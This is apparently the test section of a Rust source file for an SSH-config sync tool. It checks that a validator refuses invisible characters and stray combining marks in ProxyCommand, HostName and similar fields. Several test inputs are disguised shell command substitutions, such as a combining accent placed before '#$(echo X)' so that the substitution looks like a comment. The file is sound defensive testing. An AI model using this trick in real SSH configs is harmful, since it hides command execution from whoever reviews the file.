        ('\u{1680}', '\u{1680}'),
        ('\u{2000}', '\u{200a}'),
        ('\u{2028}', '\u{2029}'),
        ('\u{202f}', '\u{202f}'),
        ('\u{205f}', '\u{205f}'),
        ('\u{3000}', '\u{3000}'),
        ('\u{feff}', '\u{feff}'),
    ];

    /// `is_invisible` 擋的碼位就是這五類,不多也不少,一個字元一個字元對過:General_Category=Cf 的格式字元(`PUBLISHED_FORMAT`)、控制字元(Cc 就是 U+0000–U+001F 與 U+007F–U+009F,
    /// C0、DEL 與 C1,tab 除外)、非 ASCII 的空白與 BOM、`Default_Ignorable_Code_Point`,以及設計上就是空白的字元。每一類的清單都是照發布的資料另外寫的;
    /// `is_format_character` 也單獨對一次(抄錯一個端點會在這裡現形)。
    #[test]
    fn is_invisible_refuses_exactly_the_published_classes() {
        let in_ranges = |ranges: &[(char, char)], c: char| ranges.iter().any(|&(first, last)| (first..=last).contains(&c));
        for code_point in 0..=0x10ffff_u32 {
            let Some(c) = char::from_u32(code_point) else { continue };
            let format = in_ranges(&PUBLISHED_FORMAT, c);
            assert_eq!(is_format_character(c), format, "U+{code_point:04X}");
            // `char::is_control` 就是 General_Category=Cc:規則(`c.is_control() && c != '\t'`)的前提。
            let control = matches!(code_point, 0x00..=0x1f | 0x7f..=0x9f);
            assert_eq!(c.is_control(), control, "U+{code_point:04X}");
            let refused = format
                || (control && c != '\t')
                || in_ranges(&PUBLISHED_NON_ASCII_SPACES, c)
                || in_ranges(&PUBLISHED_DEFAULT_IGNORABLE, c)
                || PUBLISHED_BLANK_BY_DESIGN.contains(&c);
            assert_eq!(is_invisible(c), refused, "U+{code_point:04X}");
        }
    }

    /// 控制字元與格式字元放在 OpenSSH 會讀的地方 —— `ProxyCommand` 的一個詞裡(整段交給 shell)、`HostName` 的值裡 —— 一律擋:C1 控制字元(U+0080–U+009F)與不在
    /// `Default_Ignorable_Code_Point` 裡的 Cf 格式字元(阿拉伯文的數字記號與句末記號 U+0600–U+0605、U+06DD、U+08E2,敘利亞文的 U+070F,阿拉伯文的貨幣記號 U+0890–U+0891,
    /// 行間註記 U+FFF9–U+FFFB,卡提文的 U+110BD、U+110CD,埃及象形文字的格式控制 U+13430–U+1343F)。核准對話框會把它們顯示出來,後端卻擋不到。
    /// 記錄與同步的檔案兩個層次都要擋,訊息不回顯那一行。
    #[test]
    fn controls_and_format_characters_are_refused_inside_the_words_openssh_reads() {
        // 審查指出的碼位;U+0085 原本就擋(`is_confusable_space`),放進來把它釘住。
        for c in ['\u{80}', '\u{9f}', '\u{85}', '\u{600}', '\u{6dd}', '\u{70f}', '\u{890}', '\u{8e2}', '\u{fff9}', '\u{110bd}', '\u{13430}'] {
            let shown = c.to_string();
            for text in [
                format!("Host web\n  ProxyCommand ssh -W %h:%p bast{c}ion\n"),
                format!("Host web\n  HostName name{c}.example\n"),
            ] {
                assert_refused_everywhere(&text, Forbidden::InvisibleCharacter, "invisible formatting character", &["bast", "name.example", shown.as_str()]);
            }
        }
    }

    /// 上一個測試的另一面:註解(OpenSSH 不讀的部分)裡的全形空白、軟連字號、C1 控制字元與 Cf 格式字元照舊可用,記錄與同步的檔案兩個層次都收;CRLF 的檔案也一樣。
    #[test]
    fn controls_and_format_characters_still_pass_inside_an_openssh_comment() {
        for c in ['\u{3000}', '\u{ad}', '\u{80}', '\u{9f}', '\u{85}', '\u{600}', '\u{6dd}', '\u{70f}', '\u{890}', '\u{8e2}', '\u{fff9}', '\u{110bd}', '\u{13430}'] {
            for text in [
                format!("Host web # office{c}main\n  User a\n"),
                format!("Host web\n  HostName 10.0.0.5 # a{c}b\n"),
                format!("Host web\n  # note{c}here\n  User a\n"),
                format!("Host web\n  IdentityFile \"~/.ssh/id work\" # a{c}b\n"),
                format!("Host web # a{c}b\r\n  User a # c{c}d\r\n"),
            ] {
                assert_accepted_everywhere(&text);
            }
        }
    }

    /// 沒有基底字的組合記號:`ProxyCommand nc %h %p;<U+0301>#$(…)` 畫出來是 `;` 上一個重音、後面一個 `#`,看起來像註解的開頭;對 shell 那個記號是詞的一部分、
    /// `#` 在詞的中間,`$(…)` 照樣執行(`/bin/sh -c 'echo a;<U+0301>#$(echo X)'` 執行了 `$(…)`)。記錄與同步的檔案兩個層次都要擋。
    #[test]
    fn a_mark_without_a_base_cannot_disguise_where_a_shell_comment_starts() {
        let phrase = "combining mark or symbol where a word starts";
        let secrets = ["$(", "bastion", "%h"];
        for text in [
            // 審查指出的三種:接在 shell 的 `;` 後面、接在 `=` 後面(值的第一個字元)、接在空白後面。
            "Host web\n  ProxyCommand nc %h %p;\u{301}#$(echo X)\n",
            "Host web\n  ProxyCommand=\u{301}#$(echo X)\n",
            "Host web\n  ProxyCommand bastion \u{301}#$(echo X)\n",
            // 分隔符的其他寫法(tab、` = `、OpenSSH 會再略過的第二個 `=`)與一串記號。
            "Host web\n  ProxyCommand\t\u{301}#$(echo X)\n",
            "Host web\n  ProxyCommand = \u{301}#$(echo X)\n",
            "Host web\n  ProxyCommand = =\u{301}#$(echo X)\n",
            "Host web\n  ProxyCommand nc %h %p;\u{301}\u{301}\u{301}#$(echo X)\n",
            // `#` 之後的部分 ssh 也整段交給 shell(那一行沒有 OpenSSH 的註解):那裡的記號一樣擋。
            "Host web\n  ProxyCommand nc %h %p # \u{301}note\n",
        ] {
            assert_refused_everywhere(text, Forbidden::StrayCharacter, phrase, &secrets);
        }
        // 整行交給 shell 的五個 keyword 都一樣。
        for keyword in ["ProxyCommand", "LocalCommand", "RemoteCommand", "KnownHostsCommand", "VersionAddendum"] {
            let text = format!("Host web\n  {keyword} nc %h %p;\u{301}#$(echo X)\n");
            assert_refused_everywhere(&text, Forbidden::StrayCharacter, phrase, &secrets);
        }
        // 非 ASCII 的符號在詞的開頭一樣擋(命令列用不到)。
        for symbol in ['\u{2713}', '\u{2192}', '\u{20ac}', '\u{1f680}', '\u{300c}', '\u{ff1a}', '\u{2026}'] {
            for text in [
                format!("Host web\n  ProxyCommand ssh -W %h:%p {symbol}bastion\n"),
                format!("Host web\n  ProxyCommand={symbol}bastion\n"),
                format!("Host web\n  LocalCommand echo a;{symbol}done\n"),
            ] {
                assert_refused_everywhere(&text, Forbidden::StrayCharacter, phrase, &secrets);
            }
        }
        // 記號前面是任何一個 ASCII 的非字母數字字元(標點、空白、tab)都算詞的開頭;前面是 ASCII 字母或數字,記號就有基底字。
        for p in (0x20_u8..0x7f).map(char::from).filter(|c| !c.is_ascii_alphanumeric()).chain(['\t']) {
            let text = format!("Host web\n  ProxyCommand nc{p}\u{301}x\n");
            assert_eq!(forbidden_directive(&parse_file(&text).0), Some(Forbidden::StrayCharacter), "{text:?}");
        }
        for letter in ('a'..='z').chain('A'..='Z').chain('0'..='9') {
            let text = format!("Host web\n  ProxyCommand nc{letter}\u{301}x\n");
            assert_eq!(forbidden_directive(&parse_file(&text).0), None, "{text:?}");
        }
    }

    /// `is_alphanumeric` 單獨不夠:`Alphabetic` 屬性帶著 1380 個組合記號(Unicode 17),它們沒有基底字時一樣疊在前一個字元上,
    /// `/bin/sh -c 'echo a;<U+064B>#$(echo X)'` 一樣執行 `$(…)`。
    #[test]
    fn marks_that_std_counts_as_letters_are_refused_without_a_base_too() {
        // 都是組合記號(Mn),std 卻都說它們是字母:希臘文的 U+0345、希伯來文的 U+05B0、阿拉伯文的 U+064B 與 U+0670、天城文的 U+0941、泰文的 U+0E31 與
        // U+0E34,還有半形片假名的濁音符 U+FF9E(Lm,Grapheme_Extend)。
        for mark in ['\u{345}', '\u{5b0}', '\u{64b}', '\u{670}', '\u{941}', '\u{e31}', '\u{e34}', '\u{ff9e}'] {
            assert!(mark.is_alphanumeric(), "U+{:04X} is the kind of mark that `is_alphanumeric` lets through", mark as u32);
            for text in [
                format!("Host web\n  ProxyCommand nc %h %p;{mark}#$(echo X)\n"),
                format!("Host web\n  ProxyCommand={mark}#$(echo X)\n"),
                format!("Host web\n  ProxyCommand bastion {mark}#$(echo X)\n"),
            ] {
                assert_refused_everywhere(&text, Forbidden::StrayCharacter, "combining mark or symbol where a word starts", &["$(", "bastion"]);
            }
        }
    }

    /// `is_base_letter_or_digit` 靠 `char::escape_debug` 認出組合記號(std 沒有公開 General_Category):這裡把它釘住 —— 日後 Rust 改了跳脫的規則,
    /// 測試會在這裡明白地失敗,而不是悄悄放行記號。
    #[test]
    fn letters_and_digits_are_told_apart_from_combining_marks() {
        // Mn、Me、Mc 的組合記號(含 std 說是字母的),沒有一個算「畫得出自己位置」;符號與標點也不算。
        for mark in [
            '\u{301}', '\u{345}', '\u{5b0}', '\u{64b}', '\u{670}', '\u{93c}', '\u{941}', '\u{e31}', '\u{e34}', '\u{20dd}', '\u{ff9e}', '\u{1d165}', '\u{2713}', '\u{2026}',
        ] {
            assert!(!is_base_letter_or_digit(mark), "U+{:04X}", mark as u32);
        }
        // 各種文字的字母與數字都算,含 NFD 的韓文(組合用的 jamo 是字母)與預組合的重音字母。
        for letter in [
            'a', 'Z', '7', '\u{e9}', '\u{738b}', '\u{30ab}', '\u{e17}', '\u{e44}', '\u{627}', '\u{5d0}', '\u{939}', '\u{d55c}', '\u{1112}', '\u{1161}', '\u{11ab}', '\u{663}',
            '\u{b2}',
        ] {
            assert!(is_base_letter_or_digit(letter), "U+{:04X}", letter as u32);
        }
    }

    /// 不能誤擋:註解裡的全形空白、命令裡的 CJK 與其他文字的字母(組合記號有基底字;macOS 的 NFD 韓文用的 jamo 是字母)、字母上的重音、名稱裡的非 ASCII
    /// 字母;符號只有在整行交給 shell 的 keyword 的詞開頭才擋。
    #[test]
    fn ordinary_non_ascii_text_is_still_accepted() {
        // 字元一律寫成 `\u{…}`,不放原字元:辦公室 = U+8FA6 U+516C U+5BA4、主機 = U+4E3B U+6A5F、公司 = U+516C U+53F8、備註 = U+5099 U+8A3B、王 = U+738B、
        // 跳板機 = U+8DF3 U+677F U+6A5F、工作 = U+5DE5 U+4F5C、完成 = U+5B8C U+6210。
        for text in [
            // 註解(OpenSSH 不讀)裡的全形空白(U+3000)。
            "Host web # \u{8fa6}\u{516c}\u{5ba4}\u{3000}\u{4e3b}\u{6a5f}\n  User a\n",
            "Host web\n  HostName 10.0.0.5 # \u{516c}\u{53f8}\u{3000}VPN\n  # \u{5099}\u{8a3b}\u{3000}x\n  User a\n",
            // 整行交給 shell 的 keyword:CJK 的字母接在 `/`、空白、`=` 後面。
            "Host web\n  ProxyCommand /Users/\u{738b}/bin/proxy %h\n",
            "Host web\n  ProxyCommand ssh -W %h:%p \u{8df3}\u{677f}\u{6a5f}\n",
            "Host web\n  ProxyCommand=ssh -W %h:%p \u{8df3}\u{677f}\u{6a5f}\n",
            "Host web\n  RemoteCommand tmux attach -t \u{5de5}\u{4f5c}\n  LocalCommand echo \u{5b8c}\u{6210}\n",
            // 字母上的重音:預組合的 U+00E9,以及 e 加組合記號 U+0301(記號有基底字)。
            "Host web\n  ProxyCommand /Users/caf\u{e9}/bin/proxy %h\n",
            "Host web\n  ProxyCommand /Users/cafe\u{301}/bin/proxy %h\n",
            "Host web\n  HostName caf\u{e9}.example\n",
            "Host web\n  HostName cafe\u{301}.example\n",
            // 其他文字:組合記號跟在字母後面(泰文、阿拉伯文、希伯來文、天城文),以及 NFD 的韓文。
            "Host web\n  ProxyCommand /home/\u{e17}\u{e35}\u{e48}/proxy %h\n",
            "Host web\n  ProxyCommand /home/\u{645}\u{64f}\u{62d}\u{64e}\u{645}\u{651}\u{64e}\u{62f}/proxy %h\n",
            "Host web\n  ProxyCommand /home/\u{5e9}\u{5b8}\u{5c1}\u{5dc}\u{5d5}\u{5b9}\u{5dd}/proxy %h\n",
            "Host web\n  ProxyCommand /home/\u{939}\u{93f}\u{928}\u{94d}\u{926}\u{940}/proxy %h\n",
            "Host web\n  ProxyCommand /home/\u{1112}\u{1161}\u{11ab}\u{1100}\u{1173}\u{11af}/proxy %h\n",
            // 符號不在詞的開頭(接在字母後面)不擋;不是整行交給 shell 的 keyword,詞的開頭也不管。
            "Host web\n  ProxyCommand nc host\u{2026}name %p\n",
            "Host web\n  SetEnv GREETING=\u{2713}\n",
        ] {
            assert_accepted_everywhere(text);
        }
    }

    #[test]
    fn blocks_of_extracts_every_host_block_verbatim_and_skips_the_rest() {
        let (items, _) = parse_file(FILE);
        let blocks = blocks_of(&items);
        assert_eq!(blocks.len(), 2);
        assert_eq!(blocks[0].alias, "web-1");
        assert!(blocks[0].text.contains("#tags: prod, web"));
        assert_eq!(blocks[1].alias, "db-1");
        assert_eq!(blocks[1].text, "Host db-1\n  HostName 10.0.0.10\n");
    }

    #[test]
    fn apply_replaces_one_block_and_leaves_neighbors_byte_identical() {
        let (mut items, _) = parse_file(FILE);
        let changed = apply_host_text(&mut items, "web-1", "Host web-1\n  HostName 10.0.0.99\n\n").unwrap();
        assert!(changed);
        let text = serialize_items(&items, true);
        assert!(text.starts_with("# synced by sshelter\n\nHost web-1\n  HostName 10.0.0.99\n"));
        assert!(text.ends_with("Host db-1\n  HostName 10.0.0.10\n"));
        // 相同內容再套一次 → 無變更。
        assert!(!apply_host_text(&mut items, "web-1", "Host web-1\n  HostName 10.0.0.99\n\n").unwrap());
    }

    #[test]
    fn apply_appends_when_missing_and_rejects_non_host_text() {
        let (mut items, _) = parse_file(FILE);
        assert!(apply_host_text(&mut items, "new", "Host new\n  User root\n").unwrap());
        assert!(serialize_items(&items, true).ends_with("Host new\n  User root\n"));
        assert!(apply_host_text(&mut items, "bad", "# just a comment\n").is_err());
        assert!(apply_host_text(&mut items, "mismatch", "Host other\n").is_err());
        // 同一套規則的純檢查(A3 在合併前用它):
        assert!(validate_host_text("bad", "# just a comment\n").is_err());
        assert!(validate_host_text("mismatch", "Host other\n").is_err());
        assert!(validate_host_text("two", "Host two\nHost three\n").is_err());
        // 夾帶 Match / 全域指令 / 區塊外註解:套用後只剩 Host,與快取不一致 → 拒絕。
        assert!(validate_host_text("web", "Host web\n  User a\nMatch all\n  User b\n").is_err());
        assert!(validate_host_text("web", "# leading comment\nHost web\n").is_err());
        assert!(validate_host_text("web", "AddKeysToAgent yes\nHost web\n").is_err());
        assert!(validate_host_text("new", "Host new\n  User root\n").is_ok());
        // 區塊內的註解與尾隨空行屬於區塊本身,可以。
        assert!(validate_host_text("new", "Host new\n  # inside\n  User root\n\n").is_ok());
    }

    #[test]
    fn remove_deletes_only_that_block() {
        let (mut items, _) = parse_file(FILE);
        assert!(remove_host_block(&mut items, "web-1"));
        assert!(!remove_host_block(&mut items, "web-1"));
        let text = serialize_items(&items, true);
        assert!(!text.contains("web-1"));
        assert!(text.contains("Host db-1"));
        assert!(text.starts_with("# synced by sshelter\n"));
    }
}
